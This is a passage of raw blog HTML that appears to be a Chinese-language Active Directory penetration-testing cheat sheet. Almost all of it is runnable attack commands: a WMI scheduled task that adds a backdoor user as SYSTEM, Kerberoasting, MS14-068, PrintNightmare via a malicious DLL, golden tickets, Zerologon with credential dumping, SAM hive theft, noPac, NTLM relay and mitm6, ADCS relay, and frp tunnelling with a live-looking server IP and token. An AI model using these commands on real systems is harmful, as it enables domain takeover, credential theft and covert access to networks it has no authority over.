class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-comment"># payload必须拆分为命令和参数</span><br><span class="hljs-variable">$Command</span> = <span class="hljs-string">&quot;cmd.exe&quot;</span><br><span class="hljs-variable">$Args</span> = <span class="hljs-string">&quot;/c net user munra22 aSdf1234 /add&quot;</span><br><br><span class="hljs-variable">$Action</span> = <span class="hljs-built_in">New-ScheduledTaskAction</span> <span class="hljs-literal">-CimSession</span> <span class="hljs-variable">$Session</span> <span class="hljs-literal">-Execute</span> <span class="hljs-variable">$Command</span> <span class="hljs-literal">-Argument</span> <span class="hljs-variable">$Args</span><br><span class="hljs-built_in">Register-ScheduledTask</span> <span class="hljs-literal">-CimSession</span> <span class="hljs-variable">$Session</span> <span class="hljs-literal">-Action</span> <span class="hljs-variable">$Action</span> <span class="hljs-literal">-User</span> <span class="hljs-string">&quot;NT AUTHORITY\SYSTEM&quot;</span> <span class="hljs-literal">-TaskName</span> <span class="hljs-string">&quot;THMtask2&quot;</span><br><span class="hljs-built_in">Start-ScheduledTask</span> <span class="hljs-literal">-CimSession</span> <span class="hljs-variable">$Session</span> <span class="hljs-literal">-TaskName</span> <span class="hljs-string">&quot;THMtask2&quot;</span><br><br><span class="hljs-comment">#删除使用后的计划任务</span><br><span class="hljs-built_in">Unregister-ScheduledTask</span> <span class="hljs-literal">-CimSession</span> <span class="hljs-variable">$Session</span> <span class="hljs-literal">-TaskName</span> <span class="hljs-string">&quot;THMtask2&quot;</span><br></code></pre></td></tr></table></figure><h4 id="安装-MSI-包"><a href="#安装-MSI-包" class="headerlink" title="安装 MSI 包"></a>安装 MSI 包</h4><p>需要提前将msi包传到目标系统中</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-built_in">Invoke-CimMethod</span> <span class="hljs-literal">-CimSession</span> <span class="hljs-variable">$Session</span> <span class="hljs-literal">-ClassName</span> Win32_Product <span class="hljs-literal">-MethodName</span> Install <span class="hljs-literal">-Arguments</span> <span class="hljs-selector-tag">@</span>&#123;PackageLocation = <span class="hljs-string">&quot;C:\Windows\myinstaller.msi&quot;</span>; Options = <span class="hljs-string">&quot;&quot;</span>; AllUsers = <span class="hljs-variable">$false</span>&#125;<br></code></pre></td></tr></table></figure><p>在传统系统中，使用如下cmd命令实现相同操作:</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell">wmic /node:TARGET /user:DOMAIN\USER product call install PackageLocation=c:\Windows\myinstaller.msi<br></code></pre></td></tr></table></figure><h3 id="使用替代认证材料"><a href="#使用替代认证材料" class="headerlink" title="使用替代认证材料"></a>使用替代认证材料</h3><h3 id="获取域内所有账户名"><a href="#获取域内所有账户名" class="headerlink" title="获取域内所有账户名"></a>获取域内所有账户名</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell">python GetADUsers.py <span class="hljs-literal">-all</span> <span class="hljs-literal">-dc-ip</span> &lt;dc_ip&gt; &lt;domain&gt;/&lt;username&gt;<br></code></pre></td></tr></table></figure><h3 id="枚举smb共享"><a href="#枚举smb共享" class="headerlink" title="枚举smb共享"></a>枚举smb共享</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-comment"># 列出目标系统上通过 SMB 共享的所有文件夹及其访问权限</span><br>crackmapexec smb &lt;ip&gt; <span class="hljs-literal">-u</span> &lt;user&gt; <span class="hljs-literal">-p</span> &lt;password&gt; <span class="hljs-literal">--shares</span><br></code></pre></td></tr></table></figure><h3 id="bloodhound"><a href="#bloodhound" class="headerlink" title="bloodhound"></a>bloodhound</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-comment"># 收集整个 Active Directory 环境的关系数据，包括用户、组、计算机及其权限关系。收集到的数据会存储为 JSON 文件，供 BloodHound 图形界面分析工具使用</span><br>bloodhound<span class="hljs-literal">-python</span> <span class="hljs-literal">-d</span> &lt;domain&gt; <span class="hljs-literal">-u</span> &lt;user&gt; <span class="hljs-literal">-p</span> &lt;password&gt; <span class="hljs-literal">-gc</span> &lt;dc&gt; <span class="hljs-literal">-c</span> all<br></code></pre></td></tr></table></figure><h3 id="Kerberoasting攻击"><a href="#Kerberoasting攻击" class="headerlink" title="Kerberoasting攻击"></a>Kerberoasting攻击</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-comment"># 获取所有设置了 SPN 的用户账户信息，包含票据</span><br>GetUserSPNs.py <span class="hljs-literal">-request</span> <span class="hljs-literal">-dc-ip</span> &lt;dc_ip&gt; &lt;domain&gt;/&lt;user&gt;:&lt;password&gt;<br><br><span class="hljs-comment"># 使用 Rubeus 自动抓取票据</span><br>Rubeus.exe kerberoast /outfile:hashes.txt<br><br><span class="hljs-comment"># hashcat破解票据</span><br>hashcat <span class="hljs-literal">-m</span> <span class="hljs-number">13100</span> hashes.txt &lt;wordlist&gt;<br></code></pre></td></tr></table></figure><h3 id="MS14-068"><a href="#MS14-068" class="headerlink" title="MS14-068"></a>MS14-068</h3><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs sh">rpcclient $&gt; lookupnames &lt;name&gt;<span class="hljs-comment"># 返回指定用户名或组名的SID和账户类型</span><br><br>wmic useraccount get name,sid<span class="hljs-comment"># 列出所有用户的用户名和SID</span><br><br>auxiliary/admin/kerberos/ms14_068_kerberos_checksum<span class="hljs-comment">#msf模块</span><br><br><span class="hljs-comment"># 通过 NTLM 中继的方式，生成一个伪造的 Kerberos 票据，从而直接以域管理员权限访问目标系统</span><br>goldenPac.py -dc-ip &lt;dc_ip&gt; &lt;domain&gt;/&lt;user&gt;:<span class="hljs-string">&#x27;&lt;password&gt;&#x27;</span>@&lt;target&gt;<br>goldenPac.py -dc-ip 192.168.1.1 example.com/user1:<span class="hljs-string">&#x27;password123&#x27;</span>@192.168.1.2  <span class="hljs-comment"># 示例</span><br></code></pre></td></tr></table></figure><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-comment"># Mimikatz 的一部分,将提供的 Kerberos 票据 注入当前会话，从而以该票据的身份执行操作</span><br>kerberos::ptc <span class="hljs-string">&quot;&lt;ticket&gt;&quot;</span><br></code></pre></td></tr></table></figure><h3 id="PrintNightmare"><a href="#PrintNightmare" class="headerlink" title="PrintNightmare"></a>PrintNightmare</h3><p>即CVE-2021-1675</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-comment"># 准备恶意 DLL，其代码在被目标系统加载后执行。</span><br><span class="hljs-comment"># 在攻击者主机设置 SMB 共享，将恶意 DLL 文件存放其中。</span><br><span class="hljs-comment"># 运行 CVE-2021-1675.py</span><br>CVE<span class="hljs-literal">-2021-1675</span>.py &lt;domain&gt;/&lt;user&gt;:&lt;password&gt;<span class="hljs-selector-tag">@</span>&lt;target&gt; <span class="hljs-string">&#x27;\\&lt;smb_server_ip&gt;\&lt;share&gt;\inject.dll&#x27;</span><br></code></pre></td></tr></table></figure><h2 id="获取域控"><a href="#获取域控" class="headerlink" title="获取域控"></a>获取域控</h2><h3 id="MS14-068-Kerberos"><a href="#MS14-068-Kerberos" class="headerlink" title="MS14-068 Kerberos"></a>MS14-068 Kerberos</h3><p><a href="https://github.com/abatchy17/WindowsExploits/tree/master/MS14-068">WindowsExploits/MS14-068 at master · abatchy17/WindowsExploits — WindowsExploits/MS14-068 at master · abatchy17/WindowsExploits</a></p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell">ms<span class="hljs-literal">-14-068</span>.exe <span class="hljs-literal">-u</span>  域用户<span class="hljs-selector-tag">@</span>域控名  <span class="hljs-literal">-p</span> 域用户密码 <span class="hljs-literal">-s</span> 域用户sid <span class="hljs-literal">-d</span> 域ip<br></code></pre></td></tr></table></figure><p>利用mimikatz将工具得到的<a href="mailto:&#x54;&#x47;&#x54;&#95;&#100;&#111;&#x6d;&#x61;&#105;&#110;&#x75;&#x73;&#x65;&#x72;&#64;&#x53;&#x45;&#x52;&#x56;&#x45;&#x52;&#x2e;&#67;&#x4f;&#x4d;&#x2e;&#x63;&#99;&#97;&#99;&#x68;&#x65;">&#x54;&#x47;&#x54;&#95;&#100;&#111;&#x6d;&#x61;&#105;&#110;&#x75;&#x73;&#x65;&#x72;&#64;&#x53;&#x45;&#x52;&#x56;&#x45;&#x52;&#x2e;&#67;&#x4f;&#x4d;&#x2e;&#x63;&#99;&#97;&#99;&#x68;&#x65;</a>写入内存，创建缓存证书：</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs powershell">mimikatz.exe <span class="hljs-string">&quot;kerberos::ptc c:TGT_darthsidious@pentest.com.ccache&quot;</span> <span class="hljs-keyword">exit</span><span class="hljs-comment">#加载 Kerberos TGT到当前会话</span><br>net use k: \pentest.comc<span class="hljs-variable">$</span> <span class="hljs-comment">#将远程计算机pentest.com的C盘共享映射到本地的K:驱动器</span><br><br><span class="hljs-comment">#用psexec连接</span><br>pxesec64.exe \\域控主机名 cmd.exe<br></code></pre></td></tr></table></figure><h3 id="kerberos黄金票据"><a href="#kerberos黄金票据" class="headerlink" title="kerberos黄金票据"></a>kerberos黄金票据</h3><p>需要具备对域控制器的DCSync权限</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs powershell">lsadump::dcsync /domain:pentest.com /user:krbtgt<span class="hljs-comment"># 提取 krbtgt 账户的哈希值</span><br>kerberos::purge<span class="hljs-comment"># 清除 Mimikatz 当前会话中的所有 Kerberos 票据</span><br>kerberos::golden /admin:administrator /domain:域 /sid:SID /krbtgt:hash值 /ticket:adinistrator.kiribi <span class="hljs-comment"># 生成一个 黄金票据</span><br>kerberos::ptt administrator.kiribi<span class="hljs-comment">#将一个票据加载到当前会话中</span><br>kerberos::tgt<span class="hljs-comment">#查看当前会话的票据信息</span><br>net use k: \pnet use k: \pentest.comc<span class="hljs-variable">$</span><span class="hljs-comment">#将目标计算机 pentest.com 的 C$ 共享（管理员共享）映射到本地的 K: 驱动器</span><br></code></pre></td></tr></table></figure><h3 id="kerberos白银票据"><a href="#kerberos白银票据" class="headerlink" title="kerberos白银票据"></a>kerberos白银票据</h3><p>黄金票据和白银票据的一些区别： Golden Ticket：伪造 TGT ，可以获取 任何Kerberos 服务权限 银票：伪造TGS， 只能访问指定的服务 </p><p>加密方式不同： Golden Ticket由 krbtgt 的hash加密 Silver Ticket由 服务账号 （通常为计算机账户）Hash加密 认证流程不同： 金票在使用的过程需要同域控通信 银票在使用的过程不需要同域控通信 </p><h3 id="域服务账号破解"><a href="#域服务账号破解" class="headerlink" title="域服务账号破解"></a>域服务账号破解</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs powershell">kerberos::list /export   <span class="hljs-comment"># 列出并导出 Kerberos 票据</span><br>tgsrepcrack.py wordlist.txt <span class="hljs-number">1</span><span class="hljs-literal">-MSSQLSvc</span>~sql01.medin.local~<span class="hljs-number">1433</span><span class="hljs-literal">-MYDOMAIN</span>.LOCAL.kirbi<span class="hljs-comment"># 票据爆破</span><br></code></pre></td></tr></table></figure><h3 id="zerologon"><a href="#zerologon" class="headerlink" title="zerologon"></a>zerologon</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs powershell">python3 cve<span class="hljs-literal">-2020-1472-exploit</span>.py 域控主机名 &lt;ip&gt;<span class="hljs-comment">#将域控机器账户重置</span><br>python3 secretsdump.py &lt;DOMAIN&gt;/域控主机名<span class="hljs-variable">$</span><span class="hljs-selector-tag">@</span>&lt;IP&gt; <span class="hljs-literal">-no-pass</span> <span class="hljs-literal">-just-dc-user</span> <span class="hljs-string">&quot;Administrator&quot;</span><span class="hljs-comment">#使用dcsync导出域管理员凭证</span><br>python3 wmiexec.py <span class="hljs-literal">-hashes</span> &lt;HASH_admin&gt; &lt;DOMAIN&gt;/Administrator<span class="hljs-selector-tag">@</span>&lt;IP&gt;<span class="hljs-comment">#哈希传递，模仿域管理员身份进行登录</span><br>python3 restorepassword.py <span class="hljs-literal">-target-ip</span> &lt;IP&gt;&lt;DOMAIN&gt;/域控主机名<span class="hljs-selector-tag">@</span>域控主机名 <span class="hljs-literal">-hexpass</span> &lt;HEXPASS&gt;<br></code></pre></td></tr></table></figure><h4 id="Mimikatz示例"><a href="#Mimikatz示例" class="headerlink" title="Mimikatz示例"></a>Mimikatz示例</h4><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-comment"># $表示计算机账户而不是用户账户</span><br><span class="hljs-comment"># 通过 Zerologon 漏洞对 dc1.exploit.local 域进行攻击，绕过身份验证，进而重置域控制器的密码或获取对其的控制</span><br>lsadump::zerologon /target:dc1.exploit.local /account:dc1<span class="hljs-variable">$</span>  <br><br><span class="hljs-comment"># 多了个/exploit，表示明确要求执行攻击行为，会尝试直接控制目标域控制器，重置密码等</span><br>lsadump::zerologon /target:dc1.exploit.local /account:dc1<span class="hljs-variable">$</span> /exploit<br><br><span class="hljs-comment"># 在 Zerologon 漏洞成功利用后执行，通过 DCsync 攻击，获取域控上的重要账户信息</span><br>lsadump::dcsync /dc:dc1.exploit.local /authuser:dc1<span class="hljs-variable">$</span> /authdomain:exploit.local /authpassword:<span class="hljs-string">&quot;&quot;</span> /domain:exploit.local /authntlm /user:krbtgt<br><br><span class="hljs-comment"># 在 Zerologon 漏洞成功利用后执行，导出LSA机密信息</span><br>lsadump::postzerologon /target:conttosson.locl /account:dc<span class="hljs-variable">$</span><br></code></pre></td></tr></table></figure><h4 id="Impacket示例"><a href="#Impacket示例" class="headerlink" title="Impacket示例"></a>Impacket示例</h4><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs powershell">python cve<span class="hljs-literal">-2020-1472-exploit</span>.py DC2008 <span class="hljs-number">10.211</span>.<span class="hljs-number">55.200</span><br><br><span class="hljs-comment"># 提取指定域用户 administrator 的 NTLM 哈希值及历史密码哈希</span><br>secretsdump.py <span class="hljs-literal">-no-pass</span> cgdomain.com/<span class="hljs-string">&#x27;DC2008$&#x27;</span>@<span class="hljs-number">10.211</span>.<span class="hljs-number">55.200</span> <span class="hljs-literal">-history</span> <span class="hljs-literal">-just-dc-user</span> administrator<br><br><span class="hljs-comment"># 通过hash传递提取各个域用户的 NTLM 哈希，包含到旧的密码明文hex</span><br>secretsdump.py <span class="hljs-literal">-no-pass</span> cgdomain.com/administrator@<span class="hljs-number">10.211</span>.<span class="hljs-number">55.200</span> <span class="hljs-literal">-hashes</span> aad3b435b51404eeaad3b435b51404ee:<span class="hljs-number">3</span>add1560657a19b3166247eb3eb149ae<br><br><span class="hljs-comment"># 根据上条命令获取到的旧密码明文hex，恢复密码</span><br>python restorepassword.py cgdomain.com/DC2008@DC2008 <span class="hljs-literal">-target-ip</span> <span class="hljs-number">10.211</span>.<span class="hljs-number">55.200</span> - hexpass <span class="hljs-number">59958639</span>cbdd4523de5d42b01adb0e256e0d39aef14c8eef31f4c078862109f253bbb7b3817ab123d013856c028fa4993f5f5b9a830a3a98d87483b29df3fb55082a1f464b19220a2c04f6605d2d321a04afbb551f8f19a13d399f9f5af2aa23c5b76b49001033516fefd90cb0348256e8282b22cbf9e70d82a8b8d2916d578246e288af3af727533d36ad8950fe1c513771377d98a947c4a8eae2b581a74b6687a2e533b7e89e8d03c2e6c2123d519489869a6e33d3a8884be33107060b62e2852502261f48c097ddb68750cc55b7688cc951441cf02989a307f55c008e978edbaf31766d17b53505016c7580cb480b<br></code></pre></td></tr></table></figure><h5 id="恢复方法二"><a href="#恢复方法二" class="headerlink" title="恢复方法二"></a>恢复方法二</h5><p>通过wmic, pass the hash 拿到域控中的本地管理员权限(域管)</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs powershell">wmiexec.py <span class="hljs-literal">-hashes</span><br>aad3b435b51404eeaad3b435b51404ee:<span class="hljs-number">8</span>adfc85c3490040e942ae1e6c68f645e<br>test.local/Administrator@<span class="hljs-number">10.211</span>.<span class="hljs-number">55.38</span><br></code></pre></td></tr></table></figure><p>分别执行下列命令,拷贝本机中SAM数据库到本地</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-comment"># 保存SAM数据到本地文件</span><br>reg save HKLM\SYSTEM system.save<br>reg save HKLM\SAM sam.save<br>reg save HKLM\SECURITY security.save<br><span class="hljs-comment"># 读取或提取保存的注册表文件</span><br>get system.save<br>get sam.save<br>get security.save<br><span class="hljs-comment"># 删除保存的注册表数据文件</span><br><span class="hljs-built_in">del</span> /f system.save<br><span class="hljs-built_in">del</span> /f sam.save<br><span class="hljs-built_in">del</span> /f security.save<br></code></pre></td></tr></table></figure><p>提取明文hash</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell">secretsdump.py <span class="hljs-literal">-sam</span> sam.save <span class="hljs-literal">-system</span> system.save <span class="hljs-literal">-security</span> security.save LOCAL<br></code></pre></td></tr></table></figure><p>然后恢复。</p><h3 id="CVE-2021-42278-amp-amp-CVE-2021-42287"><a href="#CVE-2021-42278-amp-amp-CVE-2021-42287" class="headerlink" title="CVE-2021-42278 &amp;&amp; CVE-2021-42287"></a>CVE-2021-42278 &amp;&amp; CVE-2021-42287</h3><p><a href="https://github.com/safebuffer/sam-the-admin">sam-the-admin</a></p><p><a href="https://github.com/cube0x0/noPac">noPac</a></p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs powershell">./noPac.exe <span class="hljs-literal">-domain</span> dc.com <span class="hljs-literal">-user</span> username <span class="hljs-literal">-pass</span> <span class="hljs-string">&#x27;password&#x27;</span> /dc owa.dc.com /mAccount mAusername /mPassword password /service cifs /ptt<br><span class="hljs-comment"># /dc 指定目标域控的主机名或 IP 地址</span><br><span class="hljs-comment"># /mAccount 指定需要伪造的计算机账户名称</span><br><span class="hljs-comment"># /mPassword 指定伪造计算机账户的密码</span><br><span class="hljs-comment"># /service 指定需要访问的服务类型</span><br></code></pre></td></tr></table></figure><h2 id="relay-poisoning攻击"><a href="#relay-poisoning攻击" class="headerlink" title="relay/poisoning攻击"></a>relay/poisoning攻击</h2><h3 id="扫描没开启SMB签名的机器"><a href="#扫描没开启SMB签名的机器" class="headerlink" title="扫描没开启SMB签名的机器"></a>扫描没开启SMB签名的机器</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell">nmap -Pn -sS -T4 --open --script smb-security-mode -p445 ADDRESS/MASK# 扫描目标网络中的 SMB 服务，检测其安全配置和开放端口<br>crackmapexec smb $hosts --gen-relay-list relay.txt# 生成一个包含可用于 SMB 中继的目标主机列表，攻击者可以通过这个列表进行中继攻击<br>use exploit/windows/smb/smb_relay# 用 Metasploit 的 smb_relay 模块对目标进行 SMB 中继攻击<br></code></pre></td></tr></table></figure><h3 id="PetitPotam"><a href="#PetitPotam" class="headerlink" title="PetitPotam"></a>PetitPotam</h3><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs vim">PetitPotam.<span class="hljs-keyword">py</span> -d <span class="hljs-symbol">&lt;domain&gt;</span> <span class="hljs-symbol">&lt;listener_ip&gt;</span> <span class="hljs-symbol">&lt;target_ip&gt;</span><br>PetitPotam.<span class="hljs-keyword">py</span> -d example.local <span class="hljs-number">192.168</span>.<span class="hljs-number">1.100</span> <span class="hljs-number">192.168</span>.<span class="hljs-number">1.50</span># 示例<br></code></pre></td></tr></table></figure><h3 id="无SMB签名-开启IPv6-ADCS"><a href="#无SMB签名-开启IPv6-ADCS" class="headerlink" title="无SMB签名|| 开启IPv6 || ADCS"></a>无SMB签名|| 开启IPv6 || ADCS</h3><h4 id="MS08-068"><a href="#MS08-068" class="headerlink" title="MS08-068"></a>MS08-068</h4><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell">use exploit/windows/smb/smb_relay <span class="hljs-comment">#常用于windows2003 / windows server2008</span><br></code></pre></td></tr></table></figure><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs powershell">responder <span class="hljs-literal">-I</span> eth0 <span class="hljs-comment"># 启动 Responder 来监听和捕获网络中的认证请求，记得先关闭本机的 smb 和 http 服务</span><br>ntlmrelayx.py <span class="hljs-literal">-tf</span> targets.txt<span class="hljs-comment"># 将捕获的 NTLM 认证请求中继到目标机器上，绕过身份验证，获得访问权限。</span><br></code></pre></td></tr></table></figure><h4 id="mitm6-i-eth0-d"><a href="#mitm6-i-eth0-d" class="headerlink" title="mitm6 -i eth0 -d"></a>mitm6 -i eth0 -d</h4><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs powershell">mitm6 <span class="hljs-literal">-i</span> eth0 <span class="hljs-literal">-d</span> example.local<span class="hljs-comment"># 劫持域名进行监听</span><br><br><span class="hljs-comment"># 启动了一个针对 NTLM 认证请求的中继服务，并通过中继身份验证请求来获取访问目标系统的权限。</span><br>ntlmrelayx.py <span class="hljs-literal">-6</span> <span class="hljs-literal">-wh</span> &lt;attacker_ip&gt; <span class="hljs-literal">-l</span> /tmp <span class="hljs-literal">-socks</span> <span class="hljs-literal">-debug</span><br><br><span class="hljs-comment"># 同上，指定了中继目标为 SMB 协议</span><br>ntlmrelayx.py <span class="hljs-literal">-6</span> <span class="hljs-literal">-wh</span> &lt;attacker_ip&gt; <span class="hljs-literal">-t</span> smb://&lt;target&gt; <span class="hljs-literal">-l</span> /tmp <span class="hljs-literal">-socks</span> <span class="hljs-literal">-debug</span><br><br><span class="hljs-comment"># 同上， 中继目标是 LDAP 服务</span><br>ntlmrelayx.py <span class="hljs-literal">-t</span> ldaps://&lt;dc_ip&gt; <span class="hljs-literal">-wh</span> &lt;attacker_ip&gt; <span class="hljs-literal">--delegate-access</span><br><br><span class="hljs-comment"># 通过 Kerberos 认证来获取 服务票证，然后使用该票证伪装成指定用户，绕过身份验证并访问目标系统。</span><br>getST.py <span class="hljs-literal">-spn</span> cifs/&lt;target&gt; &lt;domain&gt;/&lt;netbios_name&gt;\<span class="hljs-variable">$</span> <span class="hljs-literal">-impersonate</span> &lt;user&gt;<br></code></pre></td></tr></table></figure><h4 id="ADCS"><a href="#ADCS" class="headerlink" title="ADCS"></a>ADCS</h4><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-comment"># 通过伪造认证信息对ADCS服务请求域控制器证书。</span><br>ntlmrelayx.py <span class="hljs-literal">-t</span> http://&lt;dc_ip&gt;/certsrv/certfnsh.asp <span class="hljs-literal">-debug</span> <span class="hljs-literal">-smb2support</span> <span class="hljs-literal">--adcs</span> <span class="hljs-literal">--template</span> DomainController<br><br><span class="hljs-comment"># 请求一个 TGT（Ticket Granting Ticket），并将其注入到当前的会话中。</span><br>Rubeus.exe asktgt /user:&lt;user&gt; /certificate:&lt;base64<span class="hljs-literal">-certificate</span>&gt; /ptt<br></code></pre></td></tr></table></figure><h1 id="内网穿透"><a href="#内网穿透" class="headerlink" title="内网穿透"></a>内网穿透</h1><h3 id="Neo-reGeorg"><a href="#Neo-reGeorg" class="headerlink" title="Neo-reGeorg"></a>Neo-reGeorg</h3><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">python neoreg.py -k password -u http://xx/tunnel.php   <br></code></pre></td></tr></table></figure><h3 id="frp"><a href="#frp" class="headerlink" title="frp"></a>frp</h3><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk">.<span class="hljs-regexp">/frps -c ./</span>frps.toml<br>.<span class="hljs-regexp">/frpc -c ./</span>frpc.toml<br></code></pre></td></tr></table></figure><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-comment">#frpc.toml</span><br><span class="hljs-attr">serverAddr</span> = <span class="hljs-string">&quot;124.70.209.177&quot;</span><br><span class="hljs-attr">serverPort</span> = <span class="hljs-number">12331</span><br><span class="hljs-attr">auth.token</span> = <span class="hljs-string">&quot;D74641A4-8AD7-FDCC-8C13-7AD50F222E2D&quot;</span><br><span class="hljs-attr">webServer.addr</span> = <span class="hljs-string">&quot;127.0.0.1&quot;</span><br><span class="hljs-attr">webServer.port</span> = <span class="hljs-number">7766</span><br><span class="hljs-attr">webServer.user</span> = <span class="hljs-string">&quot;admin&quot;</span><br><span class="hljs-attr">webServer.password</span> = <span class="hljs-string">&quot;admin888&quot;</span><br><br><span class="hljs-section">[[proxies]]</span><br><span class="hljs-attr">name</span> = <span class="hljs-string">&quot;socks5&quot;</span><br><span class="hljs-attr">type</span> = <span class="hljs-string">&quot;tcp&quot;</span><br><span class="hljs-attr">remotePort</span> = <span class="hljs-number">12333</span><br><span class="hljs-section">[proxies.plugin]</span><br><span class="hljs-attr">type</span> = <span class="hljs-string">&quot;socks5&quot;</span><br><br><span class="hljs-section">[[proxies]]</span><br><span class="hljs-attr">name</span> = <span class="hljs-string">&quot;admin_ui&quot;</span><br><span class="hljs-attr">type</span> = <span class="hljs-string">&quot;tcp&quot;</span><br><span class="hljs-attr">localPort</span> = <span class="hljs-number">7766</span><br><span class="hljs-attr">remotePort</span> = <span class="hljs-number">12334</span><br></code></pre></td></tr></table></figure><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-comment">#frps.toml</span><br><span class="hljs-attr">bindPort</span> = <span class="hljs-number">12331</span><br><span class="hljs-attr">auth.token</span> = <span class="hljs-string">&quot;D74641A4-8AD7-FDCC-8C13-7AD50F222E2D&quot;</span><br><span class="hljs-attr">webServer.addr</span> = <span 